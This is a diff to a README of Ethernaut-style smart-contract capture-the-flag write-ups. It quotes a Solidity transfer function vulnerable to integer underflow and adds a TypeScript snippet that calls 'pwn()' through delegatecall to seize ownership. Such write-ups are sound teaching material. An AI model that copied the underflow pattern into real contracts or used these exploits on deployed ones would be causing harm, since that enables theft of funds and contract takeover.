@@ -125,13 +125,14 @@ For this challenge we need to increment our tokens to over 20.
 
 In older versions of Solidity overflows and underflows didn't revert the tx. In this case, an underflow can be achieved in the function:
 
-````solidity
+```solidity
 function transfer(address _to, uint256 _value) public returns (bool) {
-    require(balances[msg.sender] - _value >= 0);
-    balances[msg.sender] -= _value;
-    balances[_to] += _value;
-    return true;
+  require(balances[msg.sender] - _value >= 0);
+  balances[msg.sender] -= _value;
+  balances[_to] += _value;
+  return true;
 }
+
 ```
 
 If we send a `_value` greater than the balance we have, there will be an underflow, leading to a huge number.
@@ -141,6 +142,26 @@ So, what we have to do is send, lets say 21 tokens to any other address, and the
 [Script](./scripts/05-Token.ts) | [Test](./test/05-Token.spec.ts)
 
 ## 06 - Delegation
+
+This challenge demonstrates the usage of `delegatecall` and its risks, modifying the storage of the former contract.
+
+Here is an example on how to send a transaction to the delegated contract:
+
+```typescript
+const iface = new ethers.utils.Interface(["function pwn()"]);
+const data = iface.encodeFunctionData("pwn");
+
+const tx = await attacker.sendTransaction({
+  to: delegate.address,
+  data,
+  gasLimit: 100000,
+});
+await tx.wait();
+```
+
+`gasLimit` has been explicitly set because gas estimations might fail when making delegate calls.
+
+[Script](./scripts/06-Delegation.ts) | [Test](./test/06-Delegation.spec.ts)
 
 ## 07 - Force
 
@@ -181,4 +202,7 @@ So, what we have to do is send, lets say 21 tokens to any other address, and the
 ## 26 - Motorbike
 
 ## 27 - DoubleEntryPoint
-````
+
+```
+
+```
